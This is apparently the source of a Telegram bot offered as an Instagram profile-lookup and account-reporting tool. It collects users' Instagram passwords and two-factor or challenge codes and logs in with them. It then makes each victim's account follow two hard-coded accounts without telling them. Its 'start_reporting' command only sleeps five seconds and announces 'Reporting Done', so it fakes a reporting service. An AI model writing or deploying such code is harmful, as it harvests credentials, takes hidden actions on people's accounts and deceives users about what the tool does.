import os
import asyncio
import requests
import tempfile
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, TwoFactorRequired, ChallengeRequired
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Load token from environment variable
TOKEN = os.getenv("API")

# Conversation states
USERNAME, PASSWORD, TWO_FACTOR, CHALLENGE_CHOICE, CHALLENGE_CODE, TARGET = range(6)

# Channel usernames
CHANNELS = ['OutlawBots']

# Check if user is in required channels
async def check_channel_membership(update: Update):
    user_id = update.effective_chat.id
    member_statuses = []

    for channel in CHANNELS:
        try:
            status = await update.message.chat.get_member(user_id)
            member_statuses.append(status.status)
        except Exception as e:
            print(f"Error checking membership for {channel}: {e}")
            member_statuses.append('not_member')
    
    return all(status in ['member', 'administrator'] for status in member_statuses)

# Start the conversation with login command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_membership(update):
        keyboard = [
            [InlineKeyboardButton("Join Channel", url="https://t.me/OgCodX")],
            [InlineKeyboardButton("Join Channel", url="https://t.me/OutlawBots")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("You must join the following channels to use the bot:\n"
                                         "1. @OgCodX\n"
                                         "2. @OutlawBots\n"
                                         "Please join them and click the button below to log in.", reply_markup=reply_markup)
        return ConversationHandler.END

    await update.message.reply_text("Welcome! Please enter /login to start the login process.")
    return ConversationHandler.END

# Command for starting login
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please enter your Instagram username:")
    return USERNAME

# Handler for username input
async def username_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['username'] = update.message.text
    await update.message.reply_text("Please enter your Instagram password:")
    return PASSWORD

# Handler for password input
async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = context.user_data.get('username')
    password = update.message.text

    await update.message.reply_text("Logging in, please wait...")

    cl = Client()
    context.user_data['cl'] = cl  # Store the client for later use

    try:
        cl.login(username, password)
        print(f"Successfully logged in as {username}")

        # Example follow actions
        for target in ["imperfailed", "foileds"]:
            cl.user_follow(cl.user_id_from_username(target))

        await update.message.reply_text("Successfully logged in! Please enter the target Instagram username to fetch their profile:")
        return TARGET

    except TwoFactorRequired:
        await update.message.reply_text("Two-factor authentication required. Please enter the code you received:")
        return TWO_FACTOR

    except ChallengeRequired:
        await update.message.reply_text("Login challenge required. Please enter /email or /sms to receive the security code:")
        return CHALLENGE_CHOICE

    except LoginRequired as e:
        await update.message.reply_text(f"Login failed: {str(e)}. Please try again.")
        return ConversationHandler.END

    except Exception as e:
        await update.message.reply_text(f"An error occurred: {str(e)}. Please try again.")
        return ConversationHandler.END

# Command for challenge choice
async def challenge_choice_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    choice = update.message.text.strip().lower()
    if choice not in ['email', 'sms']:
        await update.message.reply_text("Invalid choice. Please enter /email or /sms.")
        return CHALLENGE_CHOICE
    
    cl = context.user_data.get('cl')
    
    try:
        cl.challenge_resolve(choice)
        await update.message.reply_text(f"Security code sent via {choice}. Please enter the code:")
        return CHALLENGE_CODE
    except Exception as e:
        await update.message.reply_text(f"Failed to send security code: {str(e)}. Please try logging in again.")
        return ConversationHandler.END

# Handler for challenge code
async def challenge_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text
    cl = context.user_data.get('cl')

    try:
        cl.challenge_resolve(code)
        await update.message.reply_text("Successfully logged in. Please enter the target Instagram username to fetch their profile:")
        return TARGET
    except Exception as e:
        await update.message.reply_text(f"Challenge verification failed: {str(e)}. Please try logging in again.")
        return ConversationHandler.END

# Handler for target username input and profile fetch
async def fetch_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cl = context.user_data.get('cl')
    if not cl:
        await update.message.reply_text("You need to log in first.")
        return ConversationHandler.END

    target_username = update.message.text
    await update.message.reply_text("Searching for the profile, please wait...")

    try:
        user_id = cl.user_id_from_username(target_username)
        user_info = cl.user_info(user_id)

        profile_info = (
            f"Username: {user_info.username}\n"
            f"Full Name: {user_info.full_name}\n"
            f"Bio: {user_info.biography}\n"
            f"Followers: {user_info.follower_count}\n"
            f"Following: {user_info.following_count}\n"
            f"Posts: {user_info.media_count}\n"
        )

        # Fetch and send profile picture
        profile_pic_url = user_info.profile_pic_url
        
        # Download the image
        response = requests.get(profile_pic_url)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name

            # Send the photo from the temporary file
            with open(temp_file_path, 'rb') as photo_file:
                await update.message.reply_photo(photo=photo_file, caption=profile_info)

            # Clean up temporary file
            os.remove(temp_file_path)

        else:
            # If image download fails, send just the profile info
            await update.message.reply_text(f"Couldn't fetch profile picture. Here's the profile info:\n\n{profile_info}")

    except Exception as e:
        await update.message.reply_text(f"Error fetching profile: {str(e)}")

    return ConversationHandler.END

# Command for starting reporting
async def start_reporting(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = update.message.text.strip()
    await update.message.reply_text(f"Started Report process for {username}")
    
    # Send "Started" message
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Reporting Via AI...")
    
    # Wait for 5 seconds
    await asyncio.sleep(5)
    
    # Send "Done" message
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Reporting Done")

# Main function to set up the bot
def main():
    # Ensure the token is set in the environment
    if TOKEN is None:
        print("Error: Please set the API environment variable.")
        return

    application = ApplicationBuilder().token(TOKEN).build()

    # Conversation handler for managing user login and fetching profile
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start), CommandHandler('login', login_start)],
        states={
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, username_handler)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_handler)],
            TWO_FACTOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, challenge_code_handler)],
            CHALLENGE_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, challenge_choice_handler)],
            CHALLENGE_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, challenge_code_handler)],
            TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_profile)],
        },
        fallbacks=[],
        allow_reentry=True  # This allows the user to re-enter the conversation if needed
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('start_reporting', start_reporting))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
    
